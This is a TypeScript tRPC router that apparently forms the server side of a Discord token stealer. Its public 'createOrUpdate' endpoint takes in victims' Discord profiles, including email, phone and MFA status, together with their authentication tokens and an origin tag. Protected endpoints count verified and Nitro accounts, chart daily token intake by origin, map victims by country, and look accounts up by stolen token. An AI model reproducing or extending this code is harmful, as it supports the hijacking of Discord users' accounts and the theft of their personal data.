import { z } from "zod";
import {
  createTRPCRouter,
  protectedProcedure,
  publicProcedure,
} from "~/server/api/trpc";
import { TRPCError } from "@trpc/server";
import { localeToCountry, TOKEN_REGEX } from "~/lib/utils";

const zodUserShape = z.object({
  id: z.string(),
  username: z.string(),
  discriminator: z.string(),
  avatar: z.string().optional().nullable(),
  email: z.string().optional().nullable(),
  verified: z.boolean().optional(),
  accent_color: z.number().optional().nullable(),
  banner: z.string().optional().nullable(),
  bot: z.boolean().optional(),
  flags: z.number().optional(),
  global_name: z.string().optional().nullable(),
  locale: z.string().optional(),
  mfa_enabled: z.boolean().optional(),
  premium_type: z.number().optional(),
  public_flags: z.number().optional(),
  system: z.boolean().optional(),
  phone: z.string().optional().nullable(),
  nsfw_allowed: z.boolean().optional().nullable(),
  bio: z.string().optional().nullable(),
  banner_color: z.string().optional().nullable(),
});

export const accountRouter = createTRPCRouter({
  getStats: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const [verified, unverified, nitro] = await ctx.prisma.$transaction([
      ctx.prisma.discordAccount.count({
        where: { verified: true },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: false },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: true, premium_type: { gt: 0 } },
      }),
    ]);

    return {
      verified,
      unverified,
      nitro,
    };
  }),
  getCountryDistribution: protectedProcedure.query(async ({ ctx }) => {
    const localeDistribution = await ctx.prisma.discordAccount.groupBy({
      by: ["locale"],
      _count: {
        locale: true,
      },
    });
    return localeDistribution.map((entry) => ({
      id: localeToCountry(entry.locale),
      value: entry._count.locale,
    }));
  }),
  getTokenRates: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const MAX_DAYS = 12;
    const today = new Date();

    const result: Array<{ id: string; data: { x: string; y: number }[] }> = [];
    for (let i = 0; i < MAX_DAYS; i++) {
      const date = new Date();
      date.setDate(today.getDate() - i);
      const count = await ctx.prisma.discordToken.groupBy({
        by: ["origin"],
        where: {
          createdAt: {
            lte: date,
            gte: new Date(date.getTime() - 1000 * 60 * 60 * 24),
          },
        },
        _count: {
          id: true,
        },
      });

      for (const entry of count) {
        entry.origin ??= "Unknown";

        const data = {
          x: date.toLocaleDateString("en-US").slice(0, -5),
          y: entry._count.id,
        };
        const existing = result.find((r) => r.id === entry.origin);
        if (existing) {
          existing.data.push(data);
          continue;
        }

        result.push({
          id: entry.origin,
          data: [data],
        });
      }
    }

    for (const entry of result) {
      entry.data.reverse();
    }

    return result;
  }),
  createOrUpdate: publicProcedure
    .input(
      z.object({
        user: zodUserShape,
        tokens: z.array(z.string().regex(TOKEN_REGEX)),
        origin: z.string().optional(),
      })
    )
    .mutation(async ({ input, ctx }) => {
      const existingAccount = await ctx.prisma.discordAccount.findUnique({
        where: {
          id: input.user.id,
        },
        include: {
          tokens: true,
        },
      });
      if (existingAccount) {
        const tokens = input.tokens.filter((token) => {
          return !existingAccount.tokens.some((t) => t.value === token);
        });

        if (tokens.length > 0) {
          await ctx.prisma.discordAccount.update({
            where: {
              id: input.user.id,
            },
            data: {
              ...input.user,
              tokens: {
                createMany: {
                  data: tokens.map((token) => ({
                    value: token,
                    origin: input.origin,
                  })),
                },
              },
            },
          });
        }

        return;
      }

      await ctx.prisma.discordAccount.create({
        data: {
          ...input.user,
          tokens: {
            createMany: {
              data: input.tokens.map((token) => ({
                value: token,
                origin: input.origin,
              })),
            },
          },
        },
      });
    }),
  getPreviewById: publicProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const account = await ctx.prisma.discordAccount.findUnique({
        where: {
          id,
        },
        select: {
          id: true,
          username: true,
          discriminator: true,
          avatar: true,
          flags: true,
          premium_type: true,
          createdAt: true,
          _count: {
            select: {
              tokens: true,
            },
          },
        },
      });
      if (!account) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return account;
    }),
  getById: protectedProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const account = await ctx.prisma.discordAccount.findUnique({
        where: {
          id,
        },
      });
      if (!account) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return account;
    }),
  getByToken: protectedProcedure
    .input(z.string())
    .query(async ({ input: token, ctx }) => {
      const account = await ctx.prisma.discordAccount.findFirst({
        where: {
          tokens: {
            some: {
              value: token,
            },
          },
        },
      });
      if (!account) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return account;
    }),
  getAll: protectedProcedure.query(({ ctx }) => {
    return ctx.prisma.discordAccount.findMany();
  }),
});
